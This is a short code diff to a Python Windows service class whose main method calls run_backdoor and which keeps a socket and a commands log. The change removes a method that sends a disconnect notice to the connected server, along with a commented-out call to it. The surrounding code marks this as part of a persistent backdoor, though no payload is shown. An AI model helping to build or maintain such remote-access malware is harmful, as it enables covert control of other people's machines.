@@ -115,9 +115,6 @@ class Main(service.WinService):
         with open(self.commands_log_filepath) as f:
             return f.read()
 
-    def disconnect_from_server(self):
-        self.s.send(f"disconnect {self.s.getpeername()[0]}")
-
     def main(self):
         self.run_backdoor()
 
@@ -126,7 +123,6 @@ class Main(service.WinService):
         self.log("Service stopped")
 
     def __del__(self):
-        # self.disconnect_from_server()
         self.s.close()
 
 
